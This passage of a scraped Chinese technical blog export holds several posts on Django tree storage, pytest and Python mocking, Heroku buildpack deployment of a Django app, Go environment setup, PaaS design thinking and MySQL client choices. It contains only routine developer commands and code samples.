FruitManager(models.Manager): def get_queryset(self): return super(FruitManager, self).get_queryset().filter(is_delete=False) 3. 树形结构存储 物化路径 每个节点存储其完整路径编码。\n1 2 3 4 5 Name Path William 1 Jones 1/1 Blake 1/2 Adams 1/2/1 优点是读取和写入都非常快。\n邻接表模型 邻接列表表示通过保持到某些相邻节点的链接来存储树。\n1 2 3 Name Parent Next William null Joseph Jones William Blake 优点是，结构简单易懂，但是数据量很大时，基于递归的查询效率非常低。\n嵌套集 每个节点存储一些索引（通常是左右值）。\n1 2 3 4 Name left right William 1 10 Jones 2 3 Blake 4 7 优点是查询数据很快，但是更新时，需要修改的节点很大。\n区间嵌套集 将区间映射为二维空间，每一个节点根据规则对应一个分数。在涉及节点位置的层次查询时，不需要访问数据库。优点是，性能非常好，但是实现和理解起来有一点门槛。\ndjango-treebeard 实现了物化路径，嵌套集和邻接列表。 django-mptt 混合了嵌套集和邻接列表，能高效地查询子节点，被破坏时可以重建树。\n4. Pytest 找不到模块报错 报错信息：\n1 2 3 4 5 6 =================================== ERRORS ==================================== _____________ ERROR collecting home_application/test/test_mptt.py _____________ ImportError while importing test module \u0026#39;C:\\pytest\\home_application\\test\\test_mptt.py\u0026#39;. Hint: make sure your test modules/packages have valid Python names. Traceback: ImportError: No module named home_application.test.test_mptt 问题原因：\ntest 目录下，存在 __init__.py 文件，导致 Pytest 将整个 test 当作一个模块来处理。实际上，我们需要的是 Pytest 进入目录，找到 test_ 开头的文件，运行测试。只需要删除 __init__.py 文件即可。\n5. CentOS 7 中 /etc/rc.local 开机不自动运行 查看 /etc/rc.local 内容发现：\n1 2 # Please note that you must run \u0026#39;chmod +x /etc/rc.d/rc.local\u0026#39; to ensure # that this script will be executed during boot. CentOS 7 建议创建 systemd 用于开机自启动。\n如果需要使用旧的方式，则需要添加到 /etc/rc.d/rc.local。同时，执行 chmod +x /etc/rc.d/rc.local，赋予可执行权限。\n6. Secure shell Extension 插件 NaCI 退出，状态 255 报错原因是本地保存的指纹信息与主机信息不符。\n解决办法：\n在 shell 窗口，按下 Ctrl+Shift+J 进入调试窗口，在 console 执行：\n1 term_.command.removeAllKnownHosts() 清空 known_hosts 即可。\n7. Python 续行的几种方式 1，利用反斜杠\n1 2 3 4 5 6 7 8 9 a = \u0026#39;sdfaf\u0026#39; \\ \u0026#39;test\u0026#39; a = \u0026#39;1\u0026#39; + \u0026#39;2\u0026#39; + \u0026#39;3\u0026#39; + \\ \u0026#39;4\u0026#39; + \u0026#39;5\u0026#39; if False and \\ True: pass 2， 利用括号\n1 2 3 4 5 6 7 8 9 a = (\u0026#39;sdfaf\u0026#39; \u0026#39;test\u0026#39;) a = (\u0026#39;1\u0026#39; + \u0026#39;2\u0026#39; + \u0026#39;3\u0026#39; + \u0026#39;4\u0026#39; + \u0026#39;5\u0026#39;) if(False and True): pass ","description":"","id":399,"section":"post","tags":["博文","Tips","Python","Django"],"title":"开发 Tips（7）","uri":"https://www.chenshaowen.com/blog/developing-tips-7.html"},{"content":"1. 为什么需要 Mock 在做单元测试时，被测试函数有时并不是一个可执行的独立单元。被测试函数依赖于一些外部资源，比如另外一个函数的返回值、数据库中某一条数据值等。\n为了屏蔽外部依赖的干扰，我们会采用 Mock 技术。通过模拟测试资源的方式，满足依赖条件。\n从设计模式的角度看，对于满足单一职责原则的函数、类，使用 Mock 的方式忽略外部依赖进行测试也是合理的。因为，外部依赖的测试，应该在其内部完成，而不应转移到调用方。\n反推，如果单元测试不好写，那么很有可能是软件没有遵循一定的设计模式进行实践。这种情况下，最重要的是让软件符合设计模式的规范，而不要急于做单元测试。\n2. Stub、Fake、Mock 区别 实际上，Mock 并非模拟测试资源的唯一方式，类似的还有 Stub 和 Fake。\nStub 为测试对象提供了一套方法接口，模拟真实的测试资源。当测试对象调用 Stub 方法时，Stub 响应预定的结果，也可能产生预定的错误或异常。Stub 可以跟踪和测试对象的交互，但不处理出入的数据。\nFake 也提供了一套方法接口，用于跟踪和测试对象的交互，但与 Stub 不同，Fake 处理了输入的数据，并以此产生结果。\n使用 Stub 和 Fake ，都可以对测试对象进行状态验证。但是如果，想知道测试对象是否按照正确顺序调用了方法，则需要进行行为验证。\nMock 可以用于测试对象的行为验证。\n3. Python 中的 Mock 在 Python 3.3 版本之前，使用 Mock 需要先从第三方安装：\n1 pip install mock 自 Python 3.3 开始，Mock 被引入标准库中，命名为 unittest.mock。\n先来看一个简单的例子（下面均以 Python 2.7 为例）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from mock import MagicMock, patch m = MagicMock() # mock test 函数，返回值 1 m.test = MagicMock(return_value=1) # 调用 test 函数 m.test() # 输出：1 class MyObj(object): value = \u0026#39;old_value\u0026#39; my = MyObj() with patch.object(my, \u0026#39;value\u0026#39;, \u0026#39;new_value\u0026#39;): print my.value # 输出：new_value 使用 Mock 做测试的思路：\n找到被测对象的外部依赖。可能是一个函数、对象、类等。 实例化 Mock 类，得到 Mock 对象，设置 Mock 对象的行为与依赖一致。比如，返回值、对象值等。 使用 Mock 对象替换掉外部依赖。 写测试代码和判断是否符合预期的断言。 4. Mock、MagicMock、patch 使用 4.1 Mock Mock 类定义：\n1 class unittest.mock.Mock(spec=None, side_effect=None, return_value=DEFAULT, wraps=None, name=None, spec_set=None, unsafe=False, **kwargs) 重要参数：\nreturn_value，表示当 mock 对象被调用，side_effect 函数返回的是 DEFAULT 时，返回值。 side_effect，这个参数指向一个可调用或可迭代的对象。当 mock 对象被调用时，如果该函数返回值不是 DEFAULT 时，那么以该函数的返回值作为 mock 对象调用的返回值 side_effect 有三种用法：\n1，按序列返回值\n1 2 3 4 5 6 7 8 m = Mock() m.get_num = Mock(side_effect=[1, 2, 3]) p.get_num() # 输出：1 p.get_num() # 输出：2 p.get_num() # 输出：3 2，调用函数处理返回值\n1 2 3 4 m = Mock() m.get_x = Mock(side_effect=lambda x: x*2) m.get_x(\u0026#39;123\u0026#39;) # 输出：\u0026#39;123123\u0026#39; 3，主动抛出异常\n1 2 3 4 m = Mock() m.get_exp = Mock(side_effect=TypeError(\u0026#39;type error msg\u0026#39;)) m.get_exp() # 输出：TypeError: type error msg 4.2 MagicMock MagicMock 类定义：\n1 class unittest.mock.MagicMock(MagicMixin, Mock) MagicMock 是 Mock 类的一个子类，实现了很多 magic 方法和属性。\n看一个例子：\n1 2 3 4 5 6 m = Mock() list(m) # 输出： \u0026#39;Mock\u0026#39; object is not iterable mg = MagicMock() list(mg) # 输出：[] 创建 Mock 对象时，默认没有实现 __iter__ 函数，所以会报错。但是 ，MagicMock 对象中增加了这个 magic method。\n通常情况下，除非是对迭代对象的 Mock，我们感受不到 Mock 和 MagicMock 的区别。\n4.3 patch patch 是 Mock 提供的一个用于替换某些函数、属性的方法。\npatch 定义：\n1 unittest.mock.patch(target, new=DEFAULT, spec=None, create=False, spec_set=None, autospec=None, new_callable=None, **kwargs) 重要参数：\ntarget，被替换的函数字符串名，需要输入完整路径 new，替换成的 Mock 实例，默认为 MagicMock 通常有两种写法：\n使用 with 控制上下文范围，进行替换 1 2 3 4 5 6 7 8 import requests from mock import patch def request_get(url): return {\u0026#39;status\u0026#39;:200} with patch(\u0026#39;requests.get\u0026#39;, request_get): print requests.get(\u0026#39;https://api.com\u0026#39;) # 输出：{\u0026#39;status\u0026#39;: 200} 使用装饰器，替换指定的属性或函数 1 2 3 4 5 6 7 8 9 import requests from mock import patch @patch(\u0026#39;requests.get\u0026#39;, request_get) def get_data(): return requests.get(\u0026#39;https://api.com\u0026#39;) get_data() # 输出：{\u0026#39;status\u0026#39;: 200} patch 还有三个非常有用的拓展：\n替换字典用的 patch.dict 1 patch.dict(foo, {\u0026#39;newkey\u0026#39;: \u0026#39;newvalue\u0026#39;}) 多次替换用的 patch.multiple 1 @patch.multiple(\u0026#39;__main__\u0026#39;, thing=DEFAULT, other=DEFAULT) 替换实例用的 patch.object 1 @patch.object(SomeClass, \u0026#39;class_method\u0026#39;) 5. 断言 断言，用于判断测试是否符合预期。Mock 相关的断言：\nassert_not_called，没调用过 assert_called_with，调用过 assert_called_once_with，仅调用过一次 aseert_has_calls，按指定顺序调用过 assert_any_calls，是否全局调用过 reset_mock，重置调用记录 使用示例：\n1 2 3 m = Mock() m.get_a.assert_called_once() # 输出：AssertionError: Expected \u0026#39;get_a\u0026#39; to have been called once. Called 0 times. 6. 参考 https://docs.python.org/3/library/unittest.mock.html#quick-guide ","description":"","id":400,"section":"post","tags":["博文","测试","Python","Pytest","学习"],"title":"Pytest 进阶学习之 Mock","uri":"https://www.chenshaowen.com/blog/mock-of-pytest.html"},{"content":" 最近在学习 Go ，而常用的内部 PaaS 平台正好也支持 Go 以及相关 Web 框架。一套 PaaS 系统支持多种语言，其中就离不开 buildpack 机制。虽然 PaaS 平台不断在升级，但是 buildpack 机制却一直保留。本文主要是一些 buildpack 资料的整理和实践。\n1. PaaS 如何部署应用 无论是基于原生 Docker，还是 Kubernetes 的 PaaS 平台，都只解决了资源隔离的问题，并没有规约 App 的运行方式。一个 App 能运行起来，除了开发人员关注的代码，还有运维人员关注的配置信息。这些配置信息包括：\n账户配置，MySQL、Redis 账户密码等。 服务配置，服务名、端口号、第三方服务地址，如 Ceph 等。 运行时依赖，Python 2、Python 3、Golang、Nodejs 等，还包括相关依赖包，如，gunicorn 等。 实际上除了提供运行时，在运行 App 之前，PaaS 还需要执行一系列脚本，完成一些必要的运行环境构建。通常，这些脚本被称之为 buildpack，放在一个公用的 Git 仓库管理。\n2. buildpack buildpack 是 Heroku 的部署机制。Heroku 是一个支持多语言的 PaaS 平台，支持 Ruby、Java、Node.js、Scala、Clojure、Python、PHP、Perl 等语言。在 Github 上，Heroku 开源了 buildpack 。大家可以根据项目即拿即用，同时，也可以定制化开发自己的 buildpack。\nCloudFoundry 和 Heroku 的 buildpack 是兼容的，既可以部署在 Heroku 上，也可以部署在 CloudFoundry 上。很多的 PaaS 平台，都会使用到 buildpack 部署应用。buildpack 已经成为 PaaS 应用部署的事实标准。\n3. Cloud Foundry 部署原理 Cloud Foundry 是业界第一个开源 PaaS 云平台，它支持多种框架、语言、运行时环境、云平台及应用服务。Cloud Foundry 对之后的 PaaS 平台建设思路，具有非常重要的影响。很多团队，在构建 PaaS 时，会参考 Cloud Foundry 。\n下图是 Cloud Foundry 部署 App 的完整流程。\n用户使用 CF PUSH 命令上传应用 CLI 告知 CCNG 创建一个应用 CCNG 在数据库中，新增应用的记录。例如应用名称，哪一个 buildpack 等 CLI 上传程序 CCNG 将程序存起来 CLI 启动应用 由于应用尚未部署，所以 CCNG 找一台 DEA（Droplet Execution Agent），在该 DEA 内执行 buildpack 来部署应用 DEA 输出运行 buildpack 的信息 buildpack 执行完毕，输出一个 DropLet文件（编译打包的结果），DEA 将该文件存起来 DEA 将打包情况汇报给 CCNG CCNG 选择一个 DEA 来部署应用 应用在 DEA 中运行，运行结果输出到 CCNG 可以看到，buildpack 和 App 都是在一样的环境（DEA）中执行的。buildpack 非常简洁，只需要三个脚本：\nbin/detect，探测 buildpack 是否支持此应用 bin/compile，编译脚本 bin/release，打包脚本 4. 利用 Heroku buildpack 创建应用 Cloud Foundry 是私有云 PaaS 解决方案，Heroku 是公有云 PaaS 解决方案。Cloud Foundry 通过发展集成、培训等合作伙伴，构建了非常好的生态。Heroku 在公网上提供收费的应用部署服务，但提供一定的免费额度。\n这里为了简洁，没有搭建 Cloud Foundry，而是直接使用 Heroku 提供的部署服务。\n4.1 Heroku 准备 第一步，在 https://www.heroku.com/ 注册 Heroku 账户。\n第二步，安装 Heroku Toolbelt 客户端。\nToolbelt 是 Heroku 的命令行工具，允许通过命令行的方式来管理 Heroku 应用，下载地址。\n4.2 Django 项目准备 第一步，创建一个 Django 项目，用于部署测试。\n1 2 3 django-admin startproject herokupro ls herokupro/ herokupro manage.py 第二步，根据 buildpack 的约定，在项目中新建两个文件。\nrequirements.txt，App 所依赖的第三方包 Procfile，App 启动时执行的命令 1 2 3 4 5 6 cat herokupro/requirements.txt django==1.8.3 gunicorn==19.7.1 whitenoise==3.3.0 cat herokupro/Procfile web: gunicorn herokupro.wsgi 第三步，修改 Django 工程，以适应 gunicorn 部署\n在 herokupro/wsgi.py 新增：\n1 2 3 from whitenoise.django import DjangoWhiteNoise application = DjangoWhiteNoise(application) 在 herokupro/settings.py 新增\n1 2 3 4 5 6 7 BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) STATIC_ROOT = os.path.join(BASE_DIR, \u0026#39;assets\u0026#39;) STATIC_URL = \u0026#39;/static/\u0026#39; STATICFILES_STORAGE = \u0026#39;whitenoise.django.GzipManifestStaticFilesStorage\u0026#39; STATICFILES_DIRS = ( os.path.join(BASE_DIR, \u0026#39;static\u0026#39;), ) 新增 static 文件夹\n1 touch herokupro/static/keep 第四步（非必需），新建 runtime.txt 文件，指定 Python 版本。\n在 heroku-buildpack-python 的 Github 页面，可以找到可用的 Python 版本.\n1 2 cat herokupro/runtime.txt python-3.7.6 最终目录结构：\n1 2 ls herokupro/ Procfile herokupro manage.py requirements.txt runtime.txt static 4.3 创建 Heroku 应用 第一步，登陆 Heroku。\nheroku login 第二步，创建 App 。\n1 2 3 heroku create heroku-django-app-hello Creating ⬢ heroku-django-app-hello... done https://heroku-django-app-hello.herokuapp.com/ | https://git.heroku.com/heroku-django-app-hello.git Heroku 会给 App 分配两个地址：\n访问地址， https://heroku-django-app-hello.herokuapp.com/ git 仓库地址， https://git.heroku.com/heroku-django-app-hello.git 第三步，提交代码并构建、部署应用。\n1 2 3 4 git init git remote add origin https://git.heroku.com/heroku-django-app-hello.git git add . git commit -m \u0026#34;init\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 git push -u origin master Enumerating objects: 22, done. Counting objects: 100% (22/22), done. Delta compression using up to 4 threads Compressing objects: 100% (18/18), done. Writing objects: 100% (22/22), 5.23 KiB | 595.00 KiB/s, done. Total 22 (delta 5), reused 0 (delta 0) remote: Compressing source files... done. remote: Building source: remote: remote: -----\u0026gt; Python app detected remote: -----\u0026gt; Installing python-3.6.7 remote: -----\u0026gt; Installing pip remote: -----\u0026gt; Installing SQLite3 remote: -----\u0026gt; Installing requirements with pip remote: Collecting django==1.8.3 (from -r /tmp/build_a54c15c00f10fa5ae49c62b5f9169306/requirements.txt (line 1)) remote: Downloading https://files.pythonhosted.org/packages/a3/e1/0f3c17b1caa559ba69513ff72e250377c268d5bd3e8ad2b22809c7e2e907/Django-1.8.3-py2.py3-none-any.whl (6.2MB) remote: Installing collected packages: django remote: Successfully installed django-1.8.3 remote: remote: -----\u0026gt; python manage.py collectstatic --noinput remote: 63 static files copied to \u0026#39;/tmp/build_a54c15c00f10fa5ae49c62b5f9169306/staticfiles\u0026#39;. remote: remote: -----\u0026gt; Discovering process types remote: Procfile declares types -\u0026gt; web remote: remote: -----\u0026gt; Compressing... remote: Done: 48.8M remote: -----\u0026gt; Launching... remote: Released v5 remote: https://heroku-django-app-hello.herokuapp.com/ deployed to Heroku remote: remote: Verifying deploy... done. To https://git.heroku.com/heroku-django-app-hello.git * [new branch] master -\u0026gt; master 访问 Heroku 提供的 App 地址，https://heroku-django-app-hello.herokuapp.com/ ：\n在部署时，可能不会一次性成功。可以通过命令查看日志调试：\n1 heroku logs --tail --app heroku-django-app-hello 5. 参考链接 https://gearheart.io/blog/how-to-deploy-a-django-application-on-heroku/ https://github.com/heroku/heroku-buildpack-python ","description":"","id":401,"section":"post","tags":["博文","PaaS","Buildpack"],"title":"PaaS 部署之 buildpack","uri":"https://www.chenshaowen.com/blog/buildpack-for-paas-deployment.html"},{"content":"1. 常用环境变量 1.1 GOROOT $GOROOT 是安装 Go 程序包的本地目录。\n1 2 3 4 cd /c/Go ls AUTHORS CONTRIBUTORS PATENTS VERSION bin favicon.ico misc robots.txt test CONTRIBUTING.md LICENSE README.md api doc lib pkg src 1.2 GOPATH $GOPATH 是 Go 的工程目录，用来存放代码、第三方库、编译中间文件等。\n如果需要配置多个目录，在 Mac 和 Linux 下可以通过 : 分割，在 Windows 下可以使用 ; 分割表示。\n需要注意的是，go get 获取的包，默认存放在第一个目录下。\n$GOPATH 目录下，约定有三个子目录：\nsrc：存放源代码 pkg：存放编译时，生成的中间文件 bin：存放编译后生成的可执行文件，通常会将 ;%GOPATH%\\bin 加入环境变量 PATH 中，以方便执行编译后的程序。 在项目开发中，有两部分代码需要管理：\n第三方库 业务的项目源码 有三种 GOPATH 管理方式：\n多个项目，全局只有一个 GOPATH。简单，但是项目隔离不够。 第三方库和业务源码分开放置，配置两个 GOPATH 每个项目使用单独的 GOPATH，编写脚本进行编译。 通常，为了简单，会让多个项目公用一个 GOPATH。\n1 2 3 cd /c/data/go/src ls project1 project2 github.com gitlab.com /c/data/go/ 就是我配置的 GOPATH 目录。\n在 src 目录中，既有 github\\gitlab 等第三方库，也有业务相关的项目代码。\n1.3 GOBIN GOBIN 是编译之后，可执行文件的安装目录。如果设置了 GOBIN，编译后的可执行文件将不会安装到 GOPATH 下的 bin 目录。如果 GOPATH 包含了多个目录，则必须设置 GOBIN。\n2. 依赖管理 在 GOPATH 路径下，不仅存放着项目代码，还有大量第三方依赖库。当项目和依赖很多时，GOPATH 路径下的代码量会非常大，难以管理。\n2.1 vendor 从 1.5 开始，Go 加入了 vendor 机制。vendor 机制就是在项目中加入一个 vendor 文件夹，用于存放依赖，隔离项目。\n在使用 go run 或 go build 时，首先会在当前路径下的 vendor 文件夹查找依赖，当没有找到时，再从 GOPATH 中查询。但使用 go get 或 go install 命令时，Go 依然会将依赖安装到 GOPATH 中。\n2.2 dep 安装命令：\n1 go get -u github.com/golang/dep/cmd/dep 基本命令：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 dep Dep is a tool for managing dependencies for Go projects Usage: \u0026#34;dep [command]\u0026#34; Commands: init Set up a new Go project, or migrate an existing one status Report the status of the project\u0026#39;s dependencies ensure Ensure a dependency is safely vendored in the project version Show the dep version information check Check if imports, Gopkg.toml, and Gopkg.lock are in sync Examples: dep init set up a new project dep ensure install the project\u0026#39;s dependencies dep ensure -update update the locked versions of all dependencies dep ensure -add github.com/pkg/errors add a dependency to the project 在帮助文档中，已经很清楚地描述了 dep 的使用方法。除此，还有 godep、go modules 可以用来管理依赖包。\n3. 基本操作命令 go env 查看 go 的所有配置信息。\n1 2 3 4 go env set GOARCH=amd64 set GOBIN= set GOHOSTARCH=amd64 go get 下载或更新指定的依赖包，并对其进行编译和安装。\n1 go get github.com/astaxie/beego go build 编译源码文件以及依赖包。\ngo install 编译并安装指定的依赖包。\ngo clean 删除其它命令产生的文件和目录。\ngo run 编译并运行源码文件。\n4. Hello World 下载安装\n1 go get github.com/astaxie/beego 创建文件 hello.go\n1 2 3 4 5 6 7 package main import \u0026#34;github.com/astaxie/beego\u0026#34; func main() { beego.Run() } 编译运行\n1 2 3 go build hello.go ./hello.exe 2019/01/23 21:40:59.535 [I] http server Running on http://:8080 打开浏览器并访问 http://localhost:8080\n","description":"","id":402,"section":"post","tags":["博文","Go","入门"],"title":"Go 开发配置","uri":"https://www.chenshaowen.com/blog/configuration-of-developing-go.html"},{"content":"1. 我在思考什么 在大公司，有更多机会了解行业动态，参与行业变革。\n大平台的运行，不是依靠某一个人或几个人。如果这样真的能实现，那也就不能称之为大的平台。一个萝卜一个坑，各自分工，相互协同，才是现代的管理方式。\n平台做得好，有影响力，个人也会有加持。但常常会陷入一种认知误区：将平台的能力当作自己的能力。而实际上，自己只是负责其中一个小的模块。如果自己不主动学习、思考平台的框架设计，认识不到价值密集区域，那么平台的能力也就和自己无关了。\n非常幸运，我有机会参与一场 ToB 的 IT 基础架构的技术变革。在平台产品取得成功、获得影响力时，我也在不断思考，平台的核心竞争力在哪里，如何继续扩张将影响输出到其他行业。下面的内容，就是我给这些问题的答案。\n2. SaaS 的特点 SaaS 是通过随时可达的方式，直接对用户提供服务的互联网软件。常见的 SaaS 有在线邮箱、笔记、办公套件、CRM、ERP 等。\n2.1 从产品侧看 多租户。SaaS 通常是一套软件，服务所有用户。多租户模式，压缩了 SaaS 提供商的运营成本。但为了保证租户数据的安全，需要对数据进行隔离。不同的租户使用不同的数据库实例，或者通过租户 ID 的外键，对数据进行过滤。\n可定制。一套通用的 SaaS 不能够满足全部客户的需求。SaaS 提供商通常会提供一些配置给客户使用，甚至直接针对客户进行定制化开发。\n面向企业。虽然有提供给个人使用的 SaaS ，但是 SaaS 主要是面向企业的。ToC 的 SaaS 收费困难，通常仅能通过广告获得一定收益。ToB 的 SaaS ，天生具有盈利基因，很容易就能收支平衡。这是由于，SaaS 通常提供的是工具、效能服务，企业更愿意为提升生产效率付费。\n2.2 从开发侧看 质量要求高。ToC 产品出了问题，只能通过官方渠道投诉，然后不了了之。但是 ToB 不一样。企业会找到售后，处理不好，会直接影响合作是否继续。\n无状态。为了能够平行扩展，满足租户不断增长地性能需求，SaaS 应该是无状态的。通过异地多机器部署 SaaS 实例，分担不同租户的访问请求。将缓存、持久化、消息队列等状态，全部使用集群的方式存储，对 SaaS 提供服务。\n开发框架。SaaS 需要统一的开发框架。开发框架提供的公共模块，能够减少开发量、学习成本，加快定制化开发的速度。\n功能性 API。通过 API 调用，SaaS 的能力边界会被扩大。发送通知、在线支付、查询地理位置等，如果让 SaaS 实现这些功能，需要消耗大量时间，同时还不能保证质量。因此 SaaS 依附的平台应该提供相应的 API。这些 API 直接影响到 SaaS 对平台的粘性。\n3. 为什么要使用 PaaS 这两年多，我的主要工作就是做 SaaS 开发，也参与过少量 PaaS 的开发。我以使用方的角色描述，PaaS 能带来什么，更加合适。\n开发框架。正如上面所说的，为了提升开发效率，SaaS 开发者需要开发框架。但 PaaS 提供的开发框架，实际上主要是为了解决一致性的问题。PaaS 在进行部署时，会对 SaaS 进行编译封装，SaaS 得告诉 PaaS 一些必要得信息，比如环境变量、日志格式、启动参数等。\n状态服务。由于 SaaS 无状态，PaaS 需要提供 MySQL、RabbitMQ 等公共服务，不同的 SaaS 之间，这些服务又是相互隔离不可见的。\nAPI SDK 包。PaaS 通过企业总线（ESB）或网关（API GATEWAY），提供了大量第三方服务。开发者直接通过 HTTP 请求调用 API，容易拼错参数。通过 API SDK 包的方式，将远程 API 封装成本地函数调用，对开发者更友好。\n编译部署服务。提交代码之后，通过点击按钮可以完成 CI/CD 的全过程。\n监控服务。PaaS 提供日志查询，进程、服务监控等监控服务。这些指标通常是开发者关心，用来定位问题、优化性能使用。\n增强服务。基础的监控服务通常不具备侵入性，对 SaaS 没有影响，但功能较弱，不能满足开发需求。这时，就可以使用增强服务，比如 Sentry、APM、Ceph 等，需要进行配置，才能使用。\n正是由于 PaaS 提供了这些公共服务，SaaS 开发者只需要关注代码，实现功能即可。PaaS 带来的是开发、运维、运营效率的整体提升。\n4. 如何跨行业迁移 PaaS SaaS 能对接场景，与营收、成本直接关联。但如果场景无法收敛到足够少，PaaS 会是一个不错的解决方案。\n上图是，一个通用的 PaaS 解决方案。\n对于 PaaS 平台，Gartner 把它们分为两类，一类是应用部署和运行平台 aPaaS（application platform as a service)，另一类是集成平台 iPaaS（integration as a service）。 人们经常说的 PaaS 平台基本上是指 aPaaS，如 Force 和 Google App Engine。甚至衍生出了大量容器即服务的公司，直接提供容器部署服务。\n我认为 PaaS 的核心价值在 iPaaS 层。\n在我经历的 PaaS 技术变革中，最开始是通过本地目录隔离部署，之后改为 Docker + Slug 部署，现在直接使用的是 K8S + buildpack 部署。实际上，这些对 SaaS 开发者、用户来说，意义不大，反而是 PaaS 开发者获得了更多收益。平台更易维护，资源利用效率更高，对标业界标准等。\naPaaS 层同质化严重。一套好的 aPaaS 可以全行业通用。甚至，我认为 aPaaS 层可以与 DevOps 打通，aPaaS 直接执行 DevOps 流程即可。\n但，iPaaS 层不一样。iPaaS 是领域知识密集型的一层。\n在运维领域，配置管理，执行作业，都是运维才会接触到的概念。iPaaS 需要将其抽象产品化，通过 API 的方式对外提供服务。\n在电商领域，iPaaS 提供支付、物流、商品管理等平台服务。这些细分的领域，需要专业的人员去抽象、合规，最终仅通过 API 的形式对 SaaS 层输出领域能力。\n能够将需要长时间高强度训练才能掌握的能力，通过 iPaaS 有效地传导给 SaaS 开发者、客户，才是 PaaS 的核心竞争力。\n","description":"","id":403,"section":"post","tags":["博文","PaaS","思考"],"title":"领域输出才是 PaaS 的核心竞争力","uri":"https://www.chenshaowen.com/blog/domain-knowledge-is-the-key-of-paas.html"},{"content":" Pytest 测试框架使用简单、插件丰富、功能强大，被广泛用于 Python 自动化测试。本文主要介绍一些 Pytest 的基本概念和使用方法。\n1. 运行机制 第一步，Pytest 从命令行或文件中读取配置\n第二步，在指定目录下查找并导入 conftest.py 文件\n第三步，查找满足匹配条件的测试文件，通常是 test_ 开头的 py 文件\n第四步，执行 session 或 module 类型的 fixture\n第四步，查找并执行类、函数中，定义的测试用例\n2. pytest.ini 和 conftest.py 文件 首先看下测试的文件组织方式：\n1 2 3 4 5 6 7 8 / - | - pytest.ini # pytest 的配置文件 | - tests | | - conftest.py # 全局通用的配置和功能 | - fun_module # 某个模块的测试 | - test_a.py # 该模块下的测试 | - conftest.py # 该模块下通用的配置和功能 执行 Pytest 时，不仅可以使用命令行传递运行时参数，还可以使用配置文件。Pytest 查找配置文件的顺序是：\n1 2 3 4 5 path/pytest.ini path/setup.cfg # must also contain [pytest] section to match path/tox.ini # must also contain [pytest] section to match pytest.ini ... # all the way down to the root 通常在项目下放置 pytest.ini 文件，配置相关参数即可。\npytest.ini：\n1 2 3 4 5 6 7 [pytest] # 指定测试目录 testpaths = tests # 指定测试用例文件的命名格式 python_files = test_*.py # 指定 conftest 文件的路径 pytest_plugins = tests tests/conftest.py 全局依赖的配置\n1 2 def pytest_configure(): pass 运行测试时，执行命令：\n1 # pytest . -s 3. pytest.fixture fixture 是 Pytest 引入的概念，是 Pytest 提供的强大功能之一。下面来看看具体的用法：\n3.1 直接作为常量使用 1 2 3 4 5 6 @pytest.fixture() def remote_api(): return \u0026#39;success\u0026#39; def test_remote_api(remote_api): assert remote_api == \u0026#39;success\u0026#39; 3.2 作为前置函数运行 fixture 允许在执行测试用例之前，先执行一些准备动作。\n1 2 3 4 5 6 7 8 9 import pytest @pytest.fixture() def before(): pass @pytest.mark.usefixtures(\u0026#34;before\u0026#34;) def test_1(): pass 通过 autouse 和 scope，可以完成很多测试用例的准备工作。\n3.3 作用域 - scope 通过 scope 参数声明作用域，可选项有四个，默认值为 function：\nfunction，函数级，每个测试函数都会执行一次 class， 类级别，每个测试类执行一次，所有方法都可以使用 module，模块级，每个模块执行一次，模块内函数和方法都可使用 session，会话级，一次测试只执行一次，所有被找到的函数和方法都可用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @pytest.fixture(scope=\u0026#39;function\u0026#39;) def func_scope(): pass @pytest.fixture(scope=\u0026#39;module\u0026#39;) def mod_scope(): pass @pytest.fixture(scope=\u0026#39;session\u0026#39;) def sess_scope(): pass @pytest.fixture(scope=\u0026#39;class\u0026#39;) def class_scope(): pass 4. pytest.mark pytest.mark 的作用是对测试用例进行标记，从而更精细化地控制测试用例。\nmarker 不需要事先定义好就能使用，下面是一个例子：\n1 2 3 4 5 6 7 import pytest A = pytest.mark.A @A def test_A(): assert True 一些内置的 marker ：\nskip，跳过被装饰的测试用例 skipif，传递一个条件判断，满足时跳过测试 xfail，如果执行失败则认为是通过，成功则认为失败 parametrize，批量给测试用例提供数据。如果 parametrize 的参数名称和 fixture 名称一样，会覆盖 fixture。 1 2 3 4 5 6 @pytest.mark.parametrize(\u0026#39;name\u0026#39;, [\u0026#39;12345\u0026#39;, \u0026#39;abcdef\u0026#39;, \u0026#39;0a1b2c3\u0026#39;]) def test_name_length(passwd): assert len(passwd) == 6 5. 常用插件 5.1 pytest-cov pytest-cov 是一个自动检测测试覆盖率的插件。使用示例：\n1 # pytest --cov=myproj tests/ 5.2 pytest-mock mock 是为了屏蔽一些依赖项。依赖项应该有单独的测试用例，每一个测试只需要关注自身功能是否正常。使用示例：\n1 2 3 4 5 6 7 8 9 10 11 12 import os class UnixFS: @staticmethod def rm(filename): os.remove(filename) def test_unix_fs(mocker): mocker.patch(\u0026#39;os.remove\u0026#39;) UnixFS.rm(\u0026#39;file\u0026#39;) os.remove.assert_called_once_with(\u0026#39;file\u0026#39;) 5.3 pytest-html pytest-html 是一个能自动生成 HTML 格式测试报告的插件。使用示例：\n1 # pytest --html=report.html 5.4 pytest-django pytest-django 为 Django 应用和项目添加了 Pytest 支持。具体来说，pytest-django 引入了使用 pytest fixture 测试 Django 项目的能力，并且比标准的 Django 测试套件运行得更快。\n","description":"","id":404,"section":"post","tags":["博文","测试","Python","Pytest"],"title":"Pytest 入门学习","uri":"https://www.chenshaowen.com/blog/101-of-pytest.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Python3 连接数据库 Python3 主要有两个数据库连接客户端: mysqlclient 和 PyMySQL 。\nmysqlclient 是由 C 语言实现的 PyMySQL 是由 Python 实现的 在性能上， mysqlclient 比 PyMySQL 高一个数量级。但，在 PyPy 下，PyMySQL 与 mysqlclient 性能相差不大。\n如果需要使用 gevent 或 eventlet 的 monkeypatched 处理 socket， 那就选择 PyMySQL。\n2. MySQL 报错 Table \u0026lsquo;performance_schema.session_variables\u0026rsquo; doesn\u0026rsquo;t exist 执行如下命令，可解决：\n1 2 3 mysql -u root -p mysql\u0026gt; set @@global.show_compatibility_56=ON; Query OK, 0 rows affected (0.00 sec) 参考链接： 将show_compatibilty OFF和PFS编译出来的SHOW命令的文档行为\n3. 基于 Tag 进行 Git 开发 基于 Tag 创建分支：\n1 git branch v4.2.0_docs 